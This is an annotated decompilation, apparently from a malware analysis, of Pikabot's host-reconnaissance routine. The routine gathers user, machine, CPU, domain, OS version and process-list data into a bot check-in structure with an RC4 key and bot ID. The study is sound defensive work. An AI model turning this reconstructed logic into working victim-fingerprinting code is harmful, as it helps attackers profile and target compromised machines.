

void create_Victim_info(void)
{
  aux_ptr = (short *)(*(code *)_pikabot_struct + 0x50)(0x40,0x208); // kernel32.LocalAlloc
  *_pika_struct = create_victimInfo_struct(0x1291);

  ret = (*(code *)_pikabot_struct + 0xec)(aux_ptr, 0x208); // advapi32.GetUserNameW
  fill_String(*_pikabot_struct, aux_ptr); 

  ret = (*(code *)_pikabot_struct + 0xB4)(aux_ptr, 0x208); // kernel32.GetComputerNameW
  if (ret == 0) goto EXIT_WITH_ERROR_GOTO;
  fill_String(*_pikabot_struct, aux_ptr);

  fillContentWithVal((int)aux_ptr,0,0x208); // fill 0x208 0s
  get_CPU_FUllName((undefined *)aux_ptr);
  fill_with_string(*_pikabot_struct,(char *)aux_ptr);

  *ptr1 = 0x348;
  (*(code *)_pikabot_struct + 0xc8)(0,0,&ptr1,1); // user32.EnumDisplayDevicesW
  /*
    BOOL EnumDisplayDevicesW(
      [in]  LPCWSTR          lpDevice, -> If NULL, function returns information for the display adapter(s) on the machine, based on iDevNum.
      [in]  DWORD            iDevNum, -> An index value that specifies the display device of interest.
      [out] PDISPLAY_DEVICEW lpDisplayDevice, -> [in] = cb member of DISPLAY_DEVICE to the size, in bytes, of DISPLAY_DEVICE
                                                 [out] = A pointer to a DISPLAY_DEVICE structure that receives information about the display device specified by iDevNum.
      [in]  DWORD            dwFlags -> 1 = EDD_GET_DEVICE_INTERFACE_NAME = device interface name for GUID_DEVINTERFACE_MONITOR, which is registered by the operating system on a per monitor basis.
    );
  */
  fill_String(*_pikabot_struct,ptr1);

	ptr2 = 0x208
  ret = (*(code *)_pikabot_struct + 0xb8)(2,aux_ptr, &ptr2); // kernel32.GetComputerNameExW
	/* Recupera un nombre NetBIOS o DNS asociado al equipo local. Los nombres se establecen en el inicio del sistema, cuando el sistema los lee del registro.
	BOOL GetComputerNameExW(
		[in]      COMPUTER_NAME_FORMAT NameType, -> Tipo de nombre que se va a recuperar. Este parámetro es un valor del tipo de enumeración COMPUTER_NAME_FORMAT. 2 = ComputerNameDnsDomain
		[out]     LPWSTR               lpBuffer, -> Puntero a un búfer que recibe el nombre del equipo o el nombre del servidor virtual del clúster.
		[in, out] LPDWORD              nSize -> En la entrada, especifica el tamaño del búfer, en TCHAR. En la salida, recibe el número de TCHAR copiados en el búfer de destino, no incluida la terminación carácter null
		ret -> Si la función se ejecuta correctamente, el valor devuelto es un valor distinto de cero.
	);
	*/
  if (ret == 0) goto EXIT_WITH_ERROR_GOTO;
  if (aux_ptr == 0) {
    fillNext4B(*_pikabot_struct,0x1cc4);
    fillNext4B(*_pikabot_struct,0x1cc4);
    fillNext4B(*_pikabot_struct,0x1cc4);
  } else {
    fill_String(*_pikabot_struct,aux_ptr);
    ret = (*(code *)_pikabot_struct + 0xe0)(0,aux_ptr,0,0,0,&ptr3); // logoncli.DsGetDcNameW
		/*
		DSGETDCAPI DWORD DsGetDcNameW(
			[in]  LPCWSTR                  ComputerName, -> Optional
			[in]  LPCWSTR                  DomainName,
			[in]  GUID                     *DomainGuid,-> Optional
			[in]  LPCWSTR                  SiteName, -> Optional
			[in]  ULONG                    Flags,-> 0 =  No se están aplicando criterios específicos, como la preferencia por un controlador de catálogo global o un controlador de dominio primario.
			[out] PDOMAIN_CONTROLLER_INFOW *DomainControllerInfo
		);
		ret -> SUCESS =  ERROR_SUCCESS == 0
		typedef struct _DOMAIN_CONTROLLER_INFOA {
			LPSTR DomainControllerName;
			LPSTR DomainControllerAddress;
			ULONG DomainControllerAddressType;
			GUID  DomainGuid;
			LPSTR DomainName;
			LPSTR DnsForestName;
			ULONG Flags;
			LPSTR DcSiteName;
			LPSTR ClientSiteName;
		} DOMAIN_CONTROLLER_INFOA, *PDOMAIN_CONTROLLER_INFOA;
		*/
    if (ret != 0) {
      fillNext4B(*_pikabot_struct,0x1cc4);
    	fillNext4B(*_pikabot_struct,0x1cc4);
    }
    fill_String(*_pikabot_struct, *ptr3);
    fill_String(*_pikabot_struct, ptr3 + 0x04);
  }


	*ptr4 =  0x40; // dwLength
  ret = (*(code *)_pikabot_struct + 0xbc)(ptr4); // kernel32.GlobalMemoryStatusEx
	/*
		BOOL GlobalMemoryStatusEx(
			[in, out] LPMEMORYSTATUSEX lpBuffer
		);
		ret -> Si la función se realiza correctamente, el valor devuelto es distinto de cero

		typedef struct _MEMORYSTATUSEX {
			DWORD     dwLength;
			DWORD     dwMemoryLoad;
			DWORDLONG ullTotalPhys; -> 0x8
			DWORDLONG ullAvailPhys; -> 0xc
			DWORDLONG ullTotalPageFile;
			DWORDLONG ullAvailPageFile;
			DWORDLONG ullTotalVirtual;
			DWORDLONG ullAvailVirtual;
			DWORDLONG ullAvailExtendedVirtual;
		} MEMORYSTATUSEX, *LPMEMORYSTATUSEX;
	*/
  if (ret != 0) {

		ullTotalPhys = ptr4 + 0x8;
		ullAvailPhys = ptr4 + 0xc; 
		combined_mem_data = ullTotalPhys >> 0x14 | ullAvailPhys << 0xc;
		// Los bits altos contienen una representación de ullTotalPhys en MiB.
		// Los bits bajos contienen una representación ampliada de ullAvailPhys.
    fillNext4B(*_pikabot_struct, combined_mem_data);

    desktop_window = (*(code *)_pikabot_struct + 0xcc)(); // user32.GetDesktopWindow
		// El valor devuelto es un identificador de la ventana de escritorio.
    if (desktop_window == 0) {
      fillNext4B(*_pikabot_struct,0);
    } else {
      (*(code *)_pikabot_struct + 0xd0 )(desktop_window, ptr5); // user32.GetWindowRect
			// Recupera las dimensiones del rectángulo delimitador de la ventana especificada
			/*
				BOOL GetWindowRect(
					[in]  HWND   hWnd,
					[out] LPRECT lpRect
				);
				typedef struct tagRECT {
					LONG left;
					LONG top;
					LONG right;
					LONG bottom;
				} RECT, *PRECT, *NPRECT, *LPRECT;
			*/
      fillNext4B(*_pikabot_struct, ptr5 + 0x8); // gurada el valor de la esquina derecha de la ventana actual X 
    }
    fillNext4B(*_pikabot_struct,ptr5 + 0xc); // gurada el valor de la esquina derecha de la ventana actual Y


    fillContentWithVal((int)ptr6,0,0x11c);
    ptr6[0] = 0x11c; // ptr6 -> _OSVERSIONINFOEXW
    (*(code *)_pikabot_struct + 0x24)(ptr6); // ntdll.RtlGetVersion
		/*
			typedef struct _OSVERSIONINFOEXW {
			ULONG  dwOSVersionInfoSize;
			ULONG  dwMajorVersion;
			ULONG  dwMinorVersion;
			ULONG  dwBuildNumber;
			ULONG  dwPlatformId;
			WCHAR  szCSDVersion[128];
			USHORT wServicePackMajor;
			USHORT wServicePackMinor;
			USHORT wSuiteMask;
			UCHAR  wProductType;
			UCHAR  wReserved;
		} OSVERSIONINFOEXW, *POSVERSIONINFOEXW, *LPOSVERSIONINFOEXW, RTL_OSVERSIONINFOEXW, *PRTL_OSVERSIONINFOEXW;
		*/
    fillNext4B(*_pikabot_struct,ptr6 + 0x4); // dwMajorVersion
    fillNext4B(*_pikabot_struct,ptr6 + 0x8); // dwMinorVersion
    fillNext4B(*_pikabot_struct,?);
    fillNext4B(*_pikabot_struct,?);
    fillNext4B(*_pikabot_struct,ptr6 + 0xc); // dwBuildNumber
		

    fillNext4B(*_pikabot_struct,(uint)*(ushort *)(_pikabot_struct + 0x150)); // 9
    ret = call_NtQueryInformationToken();
    fillNext4B(*_pikabot_struct,ret);
    fillNext4B(*_pikabot_struct,_pikabot_struct + 160); // 74
    fillNext4B(*_pikabot_struct,_pikabot_struct + 168); // 2e
    fill_String(*_pikabot_struct,(short *)_pikabot_struct + 16c); // L"1.8.32-beta"
    fill_String(*_pikabot_struct,(short *)_pikabot_struct + 170); // L"GG21_T_DLL@T@f0adda360d2b4ccda11468e026526576"


    snapshot_handle = (*(code *)_pikabot_struct + 0x9c)(2,0); // kernel32.CreateToolhelp32Snapshot
		/*
		HANDLE CreateToolhelp32Snapshot(
			[in] DWORD dwFlags, -> 2 = TH32CS_SNAPPROCESS: includes all processes in the system in the snapshot
			[in] DWORD th32ProcessID -> 0 = Current Process
		);
		ret -> open handle to the specified snapshot; -1 if failure
		*/
    if (snapshot_handle != -1) {
      process_entry_ptr[0] = 0x22c;
      ret = (*(code *)_pikabot_struct + 0xa0)(snapshot_handle, process_entry_ptr); // kernel32.Process32FirstW
			/*
			BOOL Process32FirstW(
				[in]      HANDLE            hSnapshot,
				[in, out] LPPROCESSENTRY32W lppe -> 
			);
			ret -> Devuelve TRUE si la primera entrada de la lista de procesos se ha copiado en el búfer o FALSE de lo contrario

			typedef struct tagPROCESSENTRY32W {
				0x00 DWORD     dwSize; -> 0x22c
				0x04 DWORD     cntUsage;
				0x08 DWORD     th32ProcessID; -> si es 0 => System Idle Process
				0x0c ULONG_PTR th32DefaultHeapID;
				0x10 DWORD     th32ModuleID;
				0x14 DWORD     cntThreads;
				0x18 DWORD     th32ParentProcessID;
				0x1c LONG      pcPriClassBase;
				0x20 DWORD     dwFlags;
				0x24 WCHAR     szExeFile[MAX_PATH]; -> nombre del archivo ejecutable
			} PROCESSENTRY32W;
						*/
      if ((int)ret != 0) {

        do {
          proc_could_be_opened = 0;
          openProcessID = (*(code *)_pikabot_struct + 0x74)(0x1fffff,0, process_entry_ptr + 0x08); // kernel32.OpenProcess
					/*
					HANDLE OpenProcess(
						[in] DWORD dwDesiredAccess, -> 0x1fffff -> Acceso completo : STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE |  PROCESS_TERMINATE |  PROCESS_CREATE_THREAD  | PROCESS_SET_SESSIONID  | PROCESS_VM_OPERATION  |PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA | PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME | PROCESS_QUERY_LIMITED_INFORMATION 
						[in] BOOL  bInheritHandle,  -> 0 : los procesos creados por este prceso no heredan el identificador
						[in] DWORD dwProcessId			-> process_entry_ptr +0x08 = th32ProcessID
					);
					ret -> Si la función se ejecuta correctamente, el valor devuelto es un identificador abierto para el proceso especificado. NULL si failure
					*/

          if (openProcessID != 0) {
            if (*(short *)(_pikabot_struct + 0x150) == 0) { // 9
              Wow64Process = 0;
            } else {
              (*(code *)_pikabot_struct +0xac)(openProcessID,&Wow64Process); // kernel32.IsWow64Process
							/*
							BOOL IsWow64Process(
								[in]  HANDLE hProcess,
								[out] PBOOL  Wow64Process -> Puntero a un valor establecido en TRUE si el proceso se ejecuta en WOW64 en un procesador Intel64 o 
										x64. Si el proceso se ejecuta en Windows de 32 bits, el valor se establece en FALSE. 
										Si el proceso es una aplicación de 32 bits que se ejecuta en Windows 10 de 64 bits en ARM, 
										el valor se establece en FALSE. Si el proceso es una aplicación de 64 bits que se ejecuta en Windows de 64 bits, 
										el valor también se establece en FALSE.
							);
							*/
            }
            proc_could_be_opened = 1;
          }

          bool_isThisProc = _pikabot_struct + 0x144 == process_entry_ptr + 0x08; // (this) process_ID

          fillNext4B(*_pika_struct, process_entry_ptr + 0x08); // process ID
          fillNext4B(*_pikabot_struct, process_entry_ptr + 0x18); // th32ParentProcessID
          fillNext4B(*_pikabot_struct, Wow64Process);
          fillNext4B(*_pikabot_struct, bool_isThisProc);
          fillNext4B(*_pikabot_struct, proc_could_be_opened);
          fillNext4B(*_pikabot_struct, process_entry_ptr + 0x1c); // pcPriClassBase
          fillNext4B(*_pikabot_struct, process_entry_ptr + 0x14); // cntThreads
          fill_String(*_pikabot_struct, process_entry_ptr + 0x20); // szExeFile

          openProcessID = (*(code *)_pikabot_struct + 0xa4)(snapshot_handle, process_entry_ptr); // kernel32.Process32NextW
        } while (openProcessID != 0);


        (*(code *)_pikabot_struct + 0x98)(snapshot_handle); // kernel32.CloseHandle

        if (aux_ptr != (short *)0x0) {
          (*(code *)_pikabot_struct + 0x58)(aux_ptr); // kernel32.LocalFree
        }
        return;
      }

      (*(code *)_pikabot_struct + 0x98)(snapshot_handle); // kernel32.CloseHandle
    }
  }
EXIT_WITH_ERROR_GOTO:
  _pikabot_struct + 0x08 = 1; // failure
  return;
}

undefined4 call_NtQueryInformationToken(void)
{
  NtQueryInformationToken(); // syscall id = 21
  return 0;
}

void __cdecl get_CPU_FUllName(undefined *aux_ptr)
{
  val = 0x80000000;
  get_CPUInfo(ptr2, 0x80000000); // get __cpuid with function_id=0x80000000 => ptr2 -> maxima funcion posible + AuthcAMDenti

  do {
    if (ptr2 < val) {
      return;
    }
    get_CPUInfo(ptr2, val);

    if (val == 0x80000002) {
      move_Mem(aux_ptr ,(undefined *)ptr2,0x10);

    } else {
      if (val == 0x80000003) {
        move_Mem(aux_ptr + 0x10; ,(undefined *)ptr2,0x10);
      }
      if (val == 0x80000004) {
        move_Mem(aux_ptr + 0x20; ,(undefined *)ptr2,0x10);
      }
    }
    val = val + 1;
  } while( true );
}

// Estas instrucciones realizan una consulta al procesador para obtener información sobre las características admitidas.
void __cdecl get_CPUInfo(undefined4 *ptr,int option)
{ 

  if (option == 0x80000000) {
    option_val = (undefined4 *)cpuid(option);
        /*
    EAX = option_val      = maxima funcion extendida soportada
    Procesador Intel:
      EBX = option_val+ 0x4 = sin significado
      ECX = option_val+ 0x8 = sin significado
      EDX = option_val+ 0xc = sin significado 
    Procesador AMD:
      EBX = option_val+ 0x4 = Auth
      ECX = option_val+ 0x8 = enti
      EDX = option_val+ 0xc = cAMD 
      EBXECXEDX = AuthenticAMD
  */
  } else if (option == 0x80000002) {
    option_val = (undefined4 *)cpuid(option);
    /* Modelo del procesador parte1
     ptr -> 41 4D 44 20 52 79 7A 65 6E 20 37 20 33 37 30 30  AMD Ryzen 7 3700  
    */
  } else if (option == 0x80000003) {
    option_val = (undefined4 *)cpuid(option);
    /* Modelo del procesador parte2
     ptr -> 55 20 77 69 74 68 20 52 61 64 65 6F 6E 20 56 65  U with Radeon Ve  

    */
  } else if (option == 0x80000004) {
   option_val = (undefined4 *)cpuid(option);
    /* Modelo del procesador parte3
     ptr -> 67 61 20 4D 6F 62 69 6C 65 20 47 66 78 20 20 00    ga Mobile Gfx  .  

    */
  }

  *ptr = *option_val;
  ptr + 0x4 = option_val + 0x4;
  ptr + 0x8 = option_val + 0xc;
  ptr + 0xc = option_val + 0x8;

  return;
}


undefined4 * __cdecl create_victimInfo_struct(undefined4 command)
{
  char cVar1;
  undefined4 *info;
  uint uVar2;
  char *pcVar3;
  
  info = allocate_mem_struct(command);
  fillNext4B((int)info,0); // 4B 0x0000
  fillNext4B((int)info,*info); // 4B 0x1291
  fillNext4B((int)info,0x1687); // 4B 0x1687
  fillNext4B((int)info,*(undefined4 *)(_pikabot_struct + 0x15c)); // shift size
  fillRC4key((int)info,*(undefined **)(_pikabot_struct + 0x158),0x20); // RC4 key
  fill_String((int)info,*(short **)(_pikabot_struct + 0x13c)); // botID
  fill_String((int)info,*(short **)(_pikabot_struct + 0x174)); // M3cpu 
  return info;
}



